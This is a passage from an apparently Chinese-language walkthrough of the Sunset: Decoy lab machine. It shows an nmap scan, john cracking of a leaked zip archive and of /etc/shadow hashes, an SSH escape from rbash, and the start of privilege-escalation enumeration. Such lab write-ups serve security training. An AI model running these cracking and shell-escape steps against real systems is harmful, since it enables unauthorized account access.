class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nmap -sT -sV -sC -O -p22,80 192.168.56.131<br>Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-19 08:16 EDT<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.56.131<br>Host is up (0.00052s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)<br>| ssh-hostkey: <br>|   2048 a9:b5:3e:3b:e3:74:e4:ff:b6:d5:9f:f1:81:e7:a4:4f (RSA)<br>|   256 ce:f3:b3:e7:0e:90:e2:64:ac:8d:87:0f:15:88:aa:5f (ECDSA)<br>|_  256 66:a9:80:91:f3:d8:4b:0a:69:b0:00:22:9f:3c:4c:5a (ED25519)<br>80/tcp open  http    Apache httpd 2.4.38<br>|_http-server-header: Apache/2.4.38 (Debian)<br>| http-ls: Volume /<br>| SIZE  TIME              FILENAME<br>| 3.0K  2020-07-07 16:36  save.zip<br>|_<br>|_http-title: Index of /<br>MAC Address: 08:00:27:0E:3C:2A (Oracle VirtualBox virtual NIC)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 14.77 seconds<br></code></pre></td></tr></table></figure><p>Debian 操作系统，80 端口下有个压缩文件，下载到本地查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ file save.zip                            <br>save.zip: Zip archive data, at least v2.0 to extract, compression method=deflate<br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ unzip -l save.zip <br>Archive:  save.zip<br>  Length      Date    Time    Name<br>---------  ---------- -----   ----<br>     1807  2020-06-27 18:05   etc/passwd<br>     1111  2020-07-07 16:26   etc/shadow<br>      829  2020-06-27 17:40   etc/group<br>      669  2020-02-02 02:41   etc/sudoers<br>      185  2020-06-27 16:58   etc/hosts<br>       33  2020-06-27 17:39   etc/hostname<br>---------                     -------<br>     4634                     6 files<br></code></pre></td></tr></table></figure><h2 id="zip-压缩密码爆破"><a href="#zip-压缩密码爆破" class="headerlink" title="zip 压缩密码爆破"></a>zip 压缩密码爆破</h2><p>看起来是泄露了一些敏感文件，尝试解压，但是需要密码，那接下来就考虑如何爆破出解压密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ unzip save.zip   <br>Archive:  save.zip<br>[save.zip] etc/passwd password:<br></code></pre></td></tr></table></figure><p>使用 zip2john 后续我们使用 john 进行爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ zip2john save.zip &gt; ziphash<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/passwd PKZIP Encr: TS_chk, cmplen=668, decmplen=1807, crc=B3ACDAFE ts=90AB cs=90ab <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/shadow PKZIP Encr: TS_chk, cmplen=434, decmplen=1111, crc=E11EC139 ts=834F cs=834f <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/group PKZIP Encr: TS_chk, cmplen=460, decmplen=829, crc=A1F81C08 ts=8D07 cs=8d07 <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/sudoers PKZIP Encr: TS_chk, cmplen=368, decmplen=669, crc=FF05389F ts=1535 cs=1535 <span class="hljs-built_in">type</span>=8<br>ver 2.0 efh 5455 efh 7875 save.zip/etc/hosts PKZIP Encr: TS_chk, cmplen=140, decmplen=185, crc=DFB905CD ts=8759 cs=8759 <span class="hljs-built_in">type</span>=8<br>ver 1.0 efh 5455 efh 7875 ** 2b ** save.zip/etc/hostname PKZIP Encr: TS_chk, cmplen=45, decmplen=33, crc=D9C379A9 ts=8CE8 cs=8ce8 <span class="hljs-built_in">type</span>=0<br>NOTE: It is assumed that all files <span class="hljs-keyword">in</span> each archive have the same password.<br>If that is not the <span class="hljs-keyword">case</span>, the <span class="hljs-built_in">hash</span> may be uncrackable. To avoid this, use<br>option -o to pick a file at a time.<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ <span class="hljs-built_in">ls</span><br>save.zip  ziphash<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ <span class="hljs-built_in">cat</span> ziphash                <br>save.zip:$pkzip<span class="hljs-variable">$6</span>*1*1*0*8*24*8759*a7409df1d7a76ad3809794d387209855bb7638aa589d5be62b9bf373d78055e1dd351925*1*0*8*24*1535*459926ee53809fa53fe26c3e4548cd7819791a638c8d96d3ec7cf18477ffa1e9e2e77944*1*0*8*24*834f*7d2cbe98180e5e9b8c31c5aec89c507011d26766981d17d249e5886e51ac03270b009d62*1*0*8*24*8d07*7d51a96d3e3fa4083bbfbe90ee97ddba1f39f769fcf1b2b6fd573fdca8c97dbec5bc9841*1*0*8*24*90ab*f7fe58aeaaa3c46c54524ee024bd38dae36f3110a07f1e7aba266acbf8b5ff0caf42e05e*2*0*2d*21*d9c379a9*9b9*46*0*2d*8ce8*aae40dfa55b72fd591a639c8c6d35b8cabd267f7edacb40a6ddf1285907b062c99ec6cc8b55d9f0027f553a44f*$/pkzip$::save.zip:etc/hostname, etc/hosts, etc/sudoers, etc/shadow, etc/group, etc/passwd:save.zip<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt ziphash<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (PKZIP [32/64])<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>manuel           (save.zip)     <br>1g 0:00:00:00 DONE (2023-07-19 08:36) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..whitetiger<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>得到了解压密码 <code>manuel</code>，解压文件后查看各个文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ unzip save.zip<br>Archive:  save.zip<br>[save.zip] etc/passwd password: <br>  inflating: etc/passwd              <br>  inflating: etc/shadow              <br>  inflating: etc/group               <br>  inflating: etc/sudoers             <br>  inflating: etc/hosts               <br> extracting: etc/hostname<br></code></pre></td></tr></table></figure><p>优先查看 shadow 文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ <span class="hljs-built_in">cd</span> etc                     <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ <span class="hljs-built_in">cat</span> shadow    <br>root:$6$RucK3DjUUM8TjzYJ<span class="hljs-variable">$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y</span>/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::<br>daemon:*:18440:0:99999:7:::<br>bin:*:18440:0:99999:7:::<br>sys:*:18440:0:99999:7:::<br><span class="hljs-built_in">sync</span>:*:18440:0:99999:7:::<br>games:*:18440:0:99999:7:::<br>man:*:18440:0:99999:7:::<br>lp:*:18440:0:99999:7:::<br>mail:*:18440:0:99999:7:::<br>news:*:18440:0:99999:7:::<br>uucp:*:18440:0:99999:7:::<br>proxy:*:18440:0:99999:7:::<br>www-data:*:18440:0:99999:7:::<br>backup:*:18440:0:99999:7:::<br>list:*:18440:0:99999:7:::<br>irc:*:18440:0:99999:7:::<br>gnats:*:18440:0:99999:7:::<br>nobody:*:18440:0:99999:7:::<br>_apt:*:18440:0:99999:7:::<br>systemd-timesync:*:18440:0:99999:7:::<br>systemd-network:*:18440:0:99999:7:::<br>systemd-resolve:*:18440:0:99999:7:::<br>messagebus:*:18440:0:99999:7:::<br>avahi-autoipd:*:18440:0:99999:7:::<br>sshd:*:18440:0:99999:7:::<br>avahi:*:18440:0:99999:7:::<br>saned:*:18440:0:99999:7:::<br>colord:*:18440:0:99999:7:::<br>hplip:*:18440:0:99999:7:::<br>systemd-coredump:!!:18440::::::<br>296640a3b825115a47b68fc44501c828:$6$x4sSRFte6R6BymAn<span class="hljs-variable">$zrIOVUCwzMlq54EjDjFJ2kfmuN7x2BjKPdir2Fuc9XRRJEk9FNdPliX4Nr92aWzAtykKih5PX39OKCvJZV0us</span>.:18450:0:99999:7:::<br></code></pre></td></tr></table></figure><p>拿到了两个哈希，root 的哈希大概率不能直接碰撞，不然这台靶机的难度就太低了，不过我们依然可以在后面进行试错</p><h2 id="shadow-文件爆破"><a href="#shadow-文件爆破" class="headerlink" title="shadow 文件爆破"></a>shadow 文件爆破</h2><p>这里优先爆破 <code>296640a3b825115a47b68fc44501c828</code> 用户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;root:$6$RucK3DjUUM8TjzYJ$x2etp95bJSiZy6WoJmTd7UomydMfNjo97Heu8nAob9Tji4xzWSzeE0Z2NekZhsyCaA7y/wbzI.2A2xIL/uXV9.:18450:0:99999:7:::&#x27;</span> &gt; roothash<br>                                                                                                                    <br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy/etc]<br>└─$ <span class="hljs-built_in">mv</span> roothash ../<br><br><br>┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ sudo john --wordlist=/usr/share/wordlists/rockyou.txt passwdhash<br>Using default input encoding: UTF-8<br>Loaded 1 password <span class="hljs-built_in">hash</span> (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 <span class="hljs-keyword">for</span> all loaded hashes<br>Will run 4 OpenMP threads<br>Press <span class="hljs-string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="hljs-keyword">for</span> status<br>server           (296640a3b825115a47b68fc44501c828)     <br>1g 0:00:00:05 DONE (2023-07-19 08:40) 0.1712g/s 2936p/s 2936c/s 2936C/s felton..Hunter<br>Use the <span class="hljs-string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably<br>Session completed. <br></code></pre></td></tr></table></figure><p>爆破得到了密码 <code>server</code> 。接下来就是 ssh 登录考虑收集内部信息和提权了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ ssh 296640a3b825115a47b68fc44501c828@192.168.56.131 <br>296640a3b825115a47b68fc44501c828@192.168.56.131 s password: <br>Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64</span><br><br>The programs included with the Debian GNU/Linux system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent<br>permitted by applicable law.<br>Last login: Wed Jul 19 08:45:11 2023 from 192.168.56.106<br>-rbash: <span class="hljs-built_in">dircolors</span>: <span class="hljs-built_in">command</span> not found<br></code></pre></td></tr></table></figure><p>又进入了 rbash 中</p><h2 id="rbash-绕过"><a href="#rbash-绕过" class="headerlink" title="rbash 绕过"></a>rbash 绕过</h2><p>接下来尝试绕过</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span><br>honeypot.decoy  honeypot.decoy.cpp  <span class="hljs-built_in">id</span>  ifconfig  <span class="hljs-built_in">ls</span>  <span class="hljs-built_in">mkdir</span>  ncal  SV-502  user.txt<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">whoami</span><br>-rbash: <span class="hljs-built_in">whoami</span>: <span class="hljs-built_in">command</span> not found<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">id</span><br>uid=1000(296640a3b825115a47b68fc44501c828) gid=1000(296640a3b825115a47b68fc44501c828) <span class="hljs-built_in">groups</span>=1000(296640a3b825115a47b68fc44501c828)<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ifconfig<br>-rbash: ifconfig: <span class="hljs-built_in">command</span> not found<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">export</span> <span class="hljs-variable">$PATH</span><br>-rbash: <span class="hljs-built_in">export</span>: `PATH:/home/296640a3b825115a47b68fc44501c828/<span class="hljs-string">&#x27;: not a valid identifier</span><br><span class="hljs-string"></span><br><span class="hljs-string">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ export $SHELL</span><br><span class="hljs-string">-rbash: export: `/bin/rbash&#x27;</span>: not a valid identifier<br><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cd</span><br>-rbash: <span class="hljs-built_in">cd</span>: restricted<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ /bin/sh<br>-rbash: /bin/sh: restricted: cannot specify `/<span class="hljs-string">&#x27; in command names</span><br></code></pre></td></tr></table></figure><p>可以使用的命令很少，<code>/</code> 和 cd 命令也被禁止了，也没有明显的可以利用的别的命令和方法，那就在 ssh 登录的时候进行指定</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/sunset_decoy]<br>└─$ ssh 296640a3b825115a47b68fc44501c828@192.168.56.131 -t <span class="hljs-string">&quot;bash --noprofile&quot;</span><br>296640a3b825115a47b68fc44501c828@192.168.56.131\<span class="hljs-string">&#x27;s password: </span><br><span class="hljs-string">bash: dircolors: command not found</span><br><span class="hljs-string">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ whoami</span><br><span class="hljs-string">bash: whoami: command not found</span><br></code></pre></td></tr></table></figure><p>这里已经变成了 bash 找不到命令，我们写入新的环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">export</span> PATH=/bin/:/usr/bin:<span class="hljs-variable">$PATH</span><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">whoami</span><br>296640a3b825115a47b68fc44501c828<br></code></pre></td></tr></table></figure><p>成功得到一个良好的 shell</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先查看基础信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000<br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: enp0s3: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:0e:3c:2a brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.131/24 brd 192.168.56.255 scope global dynamic enp0s3<br>       valid_lft 384sec preferred_lft 384sec<br>    inet6 fe80::a00:27ff:fe0e:3c2a/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">uname</span> -a<br>Linux 60832e9f188106ec5bcc4eb7709ce592 4.19.0-9-amd64 <span class="hljs-comment">#1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64 GNU/Linux</span><br><br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">cat</span> /etc/issue<br>Debian GNU/Linux 10 \n \l<br></code></pre></td></tr></table></figure><p> <code>sudo -l</code> 查看是否有特殊权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ sudo -l<br>sudo: unable to resolve host 60832e9f188106ec5bcc4eb7709ce592: Temporary failure <span class="hljs-keyword">in</span> name resolution<br><br>We trust you have received the usual lecture from the <span class="hljs-built_in">local</span> System<br>Administrator. It usually boils down to these three things:<br><br>    <span class="hljs-comment">#1) Respect the privacy of others.</span><br>    <span class="hljs-comment">#2) Think before you type.</span><br>    <span class="hljs-comment">#3) With great power comes great responsibility.</span><br><br>[sudo] password <span class="hljs-keyword">for</span> 296640a3b825115a47b68fc44501c828: <br>Sorry, user 296640a3b825115a47b68fc44501c828 may not run sudo on 60832e9f188106ec5bcc4eb7709ce592.<br></code></pre></td></tr></table></figure><p>查看家目录的文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih<br>total 68K<br>278645 drwxr-xr-x 5 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jul 20 04:56 .<br>262151 drwxr-xr-x 3 root                             root                             4.0K Jun 27  2020 ..<br>262357 lrwxrwxrwx 1 root                             root                                9 Jul  7  2020 .bash_history -&gt; /dev/null                                                                                                      <br>262368 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  220 Jun 27  2020 .bash_logout<br>266583 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 3.5K Jun 27  2020 .bashrc<br>278647 drwx------ 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jul 20 03:17 .config<br>274005 -rwxr-xr-x 1 root                             root                              18K Jul  7  2020 honeypot.decoy                                                                                                                  <br>273951 -rw------- 1 root                             root                             1.9K Jul  7  2020 honeypot.decoy.cpp<br>273999 lrwxrwxrwx 1 root                             root                                7 Jun 27  2020 <span class="hljs-built_in">id</span> -&gt; /bin/id<br>274000 lrwxrwxrwx 1 root                             root                               13 Jun 27  2020 ifconfig -&gt; /bin/ifconfig<br>278683 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 .<span class="hljs-built_in">local</span><br>273998 lrwxrwxrwx 1 root                             root                                7 Jun 27  2020 <span class="hljs-built_in">ls</span> -&gt; /bin/ls<br>273996 lrwxrwxrwx 1 root                             root                               10 Jun 27  2020 <span class="hljs-built_in">mkdir</span> -&gt; /bin/mkdir<br>268864 -rwxr-xr-x 1 root                             root                              807 Jun 27  2020 .profile<br>273950 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   66 Jun 27  2020 .selected_editor<br>278652 drwxr-xr-x 3 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828 4.0K Jun 27  2020 SV-502<br>266645 -rwxrwxrwx 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   33 Jul  7  2020 user.txt<br>273944 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828  173 Jun 27  2020 .wget-hsts<br></code></pre></td></tr></table></figure><p>看到一个特殊的可执行文件，其源码也在该目录下，不过没有读取的权限，使用 strings 命令查看。以下是截取出的有意思的字符</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs awk">Welcome to the Honey Pot administration manager (HPAM). Please select an option.<br><span class="hljs-number">1</span> Date.<br><span class="hljs-number">2</span> Calendar.<br><span class="hljs-number">3</span> Shutdown.<br><span class="hljs-number">4</span> Reboot.<br><span class="hljs-number">5</span> Launch an AV Scan.<br><span class="hljs-number">6</span> Check <span class="hljs-regexp">/etc/</span>passwd.<br><span class="hljs-number">7</span> Leave a note.<br><span class="hljs-number">8</span> Check all services status.<br>Option selected:<br>No available option was selected. Ending program.<br><span class="hljs-regexp">/usr/</span>bin/date<br><span class="hljs-regexp">/usr/</span>bin/cal<br>Shutdown is currently not available due to not enough privileges. Ending program.<br>Rebooting is currently not available due to not enough privileges. Ending program.<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/touch /</span>dev<span class="hljs-regexp">/shm/</span>STTY5246<br>The AV Scan will be launched incd a minute or less.<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/cat /</span>etc/passwd<br><span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/vi /</span>tmp/cmFuZG9tc2Zvc2FuZm9kYW52cw==<br><span class="hljs-regexp">/usr/</span>sbin/service apache2 status<br></code></pre></td></tr></table></figure><p>看起来是不同的数字指令会调用不同的程序，对其中提到的命令进行查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/date<br>132694 -rwxr-xr-x 1 root root 107K Feb 28  2019 /usr/bin/date<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/cal<br>136534 lrwxrwxrwx 1 root root 4 May  4  2018 /usr/bin/cal -&gt; ncal<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/touch /dev/shm/STTY5246<br> 47043 -rw-r--r-- 1 296640a3b825115a47b68fc44501c828 296640a3b825115a47b68fc44501c828   0 Jul 20 04:25 /dev/shm/STTY5246<br>132714 -rwxr-xr-x 1 root                             root                             95K Feb 28  2019 /usr/bin/touch                                                                                                                   <br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih /usr/bin/cat /etc/passwd<br>158998 -rw-r--r-- 1 root root 1.8K Jun 27  2020 /etc/passwd<br>132688 -rwxr-xr-x 1 root root  43K Feb 28  2019 /usr/bin/cat<br>296640a3b825115a47b68fc44501c828@60832e9f188106ec5bcc4eb7709ce592:~$ <span class="hljs-built_in">ls</span> -alih 